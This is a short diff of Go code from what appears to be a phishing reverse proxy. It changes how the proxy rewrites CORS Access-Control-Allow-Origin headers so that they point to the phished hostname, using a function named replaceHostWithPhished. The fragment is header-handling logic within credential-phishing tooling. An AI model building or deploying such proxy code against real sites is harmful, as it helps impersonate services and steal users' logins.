@@ -607,11 +607,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
-
 				origin_from_request := resp.Request.Header.Get("Origin")
-				if origin_from_request == "" {
-					resp.Header.Set("Access-Control-Allow-Origin", "*")
-				} else {
+				if origin_from_request != "" {
 					scheme_origin := strings.Split(origin_from_request, "//")
 					r_origin, ok := p.replaceHostWithPhished(scheme_origin[1])
 					if ok {
@@ -619,8 +616,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						final_url := scheme + "//" + r_origin
 						resp.Header.Set("Access-Control-Allow-Origin", final_url)
 					} else {
-						log.Important("Unable to translate %s, using '*' in the ACAO header.", origin_from_request)
-						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						log.Important("Unable to translate %s, in the Access-Control-Allow-Origin header. Leaving it as it is.", origin_from_request)
 					}
 				}
 			}
